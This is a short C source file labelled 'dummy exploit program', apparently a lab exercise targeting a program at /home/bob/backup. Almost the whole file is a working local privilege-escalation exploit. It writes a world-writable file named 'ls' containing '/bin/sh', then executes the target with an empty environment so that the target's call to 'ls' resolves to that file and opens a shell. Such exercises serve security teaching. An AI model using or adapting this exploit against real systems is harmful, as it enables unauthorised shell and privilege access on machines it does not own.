/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define TARGET "/home/bob/backup"

int main(void)
{
	char *args[4];
	char *env[1];

	system("echo \"/bin/sh\" > ls && chmod 777 ls");

	args[0] = TARGET; args[1] = "ls"; 
	args[2] = NULL; args[3] = NULL;
	env[0] = NULL;

	if (execve(TARGET, args, env) < 0) {
		fprintf(stderr, "execve failed.\n");
	}

	exit(0);
}